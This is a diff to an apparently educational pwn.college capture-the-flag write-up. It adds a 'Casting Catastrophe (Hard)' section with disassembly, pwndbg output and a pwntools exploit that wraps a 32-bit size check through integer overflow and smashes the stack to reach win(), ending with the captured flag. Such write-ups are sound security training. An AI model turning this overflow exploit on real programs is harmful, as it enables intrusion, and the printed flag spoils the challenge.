@@ -1585,6 +1585,8 @@ $
 
 ## Bounds Breaker (Easy)
 
+> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
+
 ```
 hacker@program-security~bounds-breaker-easy:~$ /challenge/bounds-breaker-easy 
 ###
@@ -2091,6 +2093,8 @@ $
 
 ## Bounds Breaker (Hard)
 
+> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
+
 ```
 hacker@program-security~bounds-breaker-hard:~$ /challenge/bounds-breaker-hard 
 ###
@@ -2417,6 +2421,7 @@ Let's see how this check is performed.
 
 ```
 pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
 
 # --- snip ---
 
@@ -2449,6 +2454,8 @@ pwndbg> disassemble challenge
    0x00000000004027b0 <+978>:   mov    eax,DWORD PTR [rbp-0x84]
 
 # --- snip ---
+
+End of assembler dump.
 ```
 
 If we look at the disassembly, we can see the variables, `record_num` and `record_size` are stored at the 4 bytes pointed to by `rbp-0x84` and `rbp-0x88` respectively.
@@ -2590,3 +2597,240 @@ $
 
 &nbsp;
 
+## Casting Catastrophe (Hard)
+
+```
+hacker@program-security~casting-catastrophe-hard:~$ /challenge/casting-catastrophe-hard 
+###
+### Welcome to /challenge/casting-catastrophe-hard!
+###
+
+Number of payload records to send: 2
+Size of each payload record: 2
+Send your payload (up to 4 bytes)!
+aaaa
+Goodbye!
+### Goodbye!
+```
+
+* [ ] Location of buffer
+* [ ] Location of stored return address to `main()`
+* [ ] Location of `win()`
+
+### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+
+# --- snip ---
+
+   0x0000000000401653 <+99>:    lea    rax,[rbp-0x44]
+   0x0000000000401657 <+103>:   mov    rsi,rax
+   0x000000000040165a <+106>:   lea    rdi,[rip+0xad3]        # 0x402134
+   0x0000000000401661 <+113>:   mov    eax,0x0
+   0x0000000000401666 <+118>:   call   0x4011a0 <__isoc99_scanf@plt>
+
+# --- snip ---
+
+   0x00000000004016a2 <+178>:   lea    rax,[rbp-0x48]
+   0x00000000004016a6 <+182>:   mov    rsi,rax
+   0x00000000004016a9 <+185>:   lea    rdi,[rip+0xa84]        # 0x402134
+   0x00000000004016b0 <+192>:   mov    eax,0x0
+   0x00000000004016b5 <+197>:   call   0x4011a0 <__isoc99_scanf@plt>
+
+# --- snip ---
+
+   0x00000000004016e0 <+240>:   mov    edx,DWORD PTR [rbp-0x48]
+   0x00000000004016e3 <+243>:   mov    eax,DWORD PTR [rbp-0x44]
+   0x00000000004016e6 <+246>:   imul   eax,edx
+   0x00000000004016e9 <+249>:   cmp    eax,0x25
+   0x00000000004016ec <+252>:   jbe    0x40170d <challenge+285>
+   0x00000000004016ee <+254>:   lea    rcx,[rip+0xb43]        # 0x402238 <__PRETTY_FUNCTION__.5714>
+   0x00000000004016f5 <+261>:   mov    edx,0x4d
+   0x00000000004016fa <+266>:   lea    rsi,[rip+0xa37]        # 0x402138
+   0x0000000000401701 <+273>:   lea    rdi,[rip+0xa90]        # 0x402198
+   0x0000000000401708 <+280>:   call   0x401150 <__assert_fail@plt>
+   0x000000000040170d <+285>:   mov    eax,DWORD PTR [rbp-0x44]
+
+# --- snip ---
+
+End of assembler dump.
+```
+
+This challenge makes the same mistake of multiplying two 32-bit registers, and the comparing only the part of the result stored in `eax`.
+
+* [ ] Location of buffer
+* [ ] Location of stored return address to `main()`
+* [ ] Location of `win()`
+
+Let's set a breakpoit right before the call to `read@plt`.
+
+```
+# --- snip ---
+
+   0x000000000040173f <+335>:   mov    rdx,QWORD PTR [rbp-0x10]
+   0x0000000000401743 <+339>:   mov    rax,QWORD PTR [rbp-0x8]
+   0x0000000000401747 <+343>:   mov    rsi,rax
+   0x000000000040174a <+346>:   mov    edi,0x0
+   0x000000000040174f <+351>:   call   0x401170 <read@plt>
+
+# --- snip ---
+```
+
+```
+pwndbg> break *(challenge+351)
+Breakpoint 1 at 0x40174f
+```
+
+Now let's run the program.
+
+```
+pwndbg> run
+Starting program: /challenge/casting-catastrophe-hard 
+###
+### Welcome to /challenge/casting-catastrophe-hard!
+###
+
+Number of payload records to send: 2
+Size of each payload record: 2
+Send your payload (up to 4 bytes)!
+
+Breakpoint 1, 0x000000000040174f in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
+ RAX  0x7ffec1695f10 ◂— 0
+ RBX  0x401880 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  4
+ RDI  0
+ RSI  0x7ffec1695f10 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x4021d4 ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x4011d0 (_start) ◂— endbr64 
+ R13  0x7ffec1697070 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffec1695f50 —▸ 0x7ffec1696f80 ◂— 0
+ RSP  0x7ffec1695ee0 —▸ 0x7318053626a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+ RIP  0x40174f (challenge+351) ◂— call read@plt
+─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
+ ► 0x40174f <challenge+351>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7ffec1695f10 ◂— 0
+        nbytes: 4
+ 
+   0x401754 <challenge+356>    mov    dword ptr [rbp - 0x14], eax
+   0x401757 <challenge+359>    cmp    dword ptr [rbp - 0x14], 0
+   0x40175b <challenge+363>    jns    challenge+409               <challenge+409>
+ 
+   0x40175d <challenge+365>    call   __errno_location@plt        <__errno_location@plt>
+ 
+   0x401762 <challenge+370>    mov    eax, dword ptr [rax]
+   0x401764 <challenge+372>    mov    edi, eax
+   0x401766 <challenge+374>    call   strerror@plt                <strerror@plt>
+ 
+   0x40176b <challenge+379>    mov    rsi, rax
+   0x40176e <challenge+382>    lea    rdi, [rip + 0xa6b]     RDI => 0x4021e0 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x401775 <challenge+389>    mov    eax, 0                 EAX => 0
+───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffec1695ee0 —▸ 0x7318053626a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+01:0008│-068     0x7ffec1695ee8 —▸ 0x7ffec1697088 —▸ 0x7ffec1697681 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-060     0x7ffec1695ef0 —▸ 0x7ffec1697078 —▸ 0x7ffec169765d ◂— '/challenge/casting-catastrophe-hard'
+03:0018│-058     0x7ffec1695ef8 ◂— 0x100000000
+04:0020│-050     0x7ffec1695f00 ◂— 0
+05:0028│-048     0x7ffec1695f08 ◂— 0x200000002
+06:0030│ rax rsi 0x7ffec1695f10 ◂— 0
+07:0038│-038     0x7ffec1695f18 ◂— 0
+─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x40174f challenge+351
+   1         0x401862 main+198
+   2   0x731805199083 __libc_start_main+243
+   3         0x4011fe _start+46
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+* [x] Location of buffer: `0x7ffec1695f10`
+* [ ] Location of stored return address to `main()`
+* [ ] Location of `win()`
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffec1695f60:
+ rip = 0x40174f in challenge; saved rip = 0x401862
+ called by frame at 0x7ffec1696f90
+ Arglist at 0x7ffec1695f50, args: 
+ Locals at 0x7ffec1695f50, Previous frame's sp is 0x7ffec1695f60
+ Saved registers:
+  rbp at 0x7ffec1695f50, rip at 0x7ffec1695f58
+```
+
+* [x] Location of buffer: `0x7ffec1695f10`
+* [x] Location of stored return address to `main()`: `0x7ffec1695f58`
+* [ ] Location of `win()`
+
+```
+pwndbg> info address win
+Symbol "win" is at 0x4014e9 in a file compiled without debugging.
+```
+
+* [x] Location of buffer: `0x7ffec1695f10`
+* [x] Location of stored return address to `main()`: `0x7ffec1695f58`
+* [x] Location of `win()`: `0x4014e9`
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process('/challenge/casting-catastrophe-hard')
+
+# Initialize values
+buffer_addr = 0x7ffec1695f10
+addr_of_stored_ip = 0x7ffec1695f58
+win_func_addr = 0x4014e9
+
+# Calculate offset & payload_size
+offset = addr_of_stored_ip - buffer_addr
+records_num = 65536
+records_size = 65536
+
+# Build payload
+payload = b"A" * offset
+payload += p64(win_func_addr)
+
+# Send number of records
+p.recvuntil(b'Number of payload records to send: ')
+p.sendline(str(records_num))
+
+# Send size of records
+p.recvuntil(b'Size of each payload record: ')
+p.sendline(str(records_size))
+
+# Send payload
+p.recvuntil(b'Send your payload')
+p.send(payload)
+
+p.interactive() 
+```
+
+```
+hacker@program-security~casting-catastrophe-hard:~$ python ~/script.py 
+[+] Starting local process '/challenge/casting-catastrophe-hard': pid 5355
+/home/hacker/script.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(records_num))
+/home/hacker/script.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(records_size))
+[*] Switching to interactive mode
+ (up to 4294967296 bytes)!
+[*] Process '/challenge/casting-catastrophe-hard' stopped with exit code -11 (SIGSEGV) (pid 5355)
+Goodbye!
+You win! Here is your flag:
+pwn.college{IJd8sr_N9kk7rRD9zwIz4XoDVHP.0FO5IDL4ITM0EzW}
+
+
+[*] Got EOF while reading in interactive
+$ 
+```
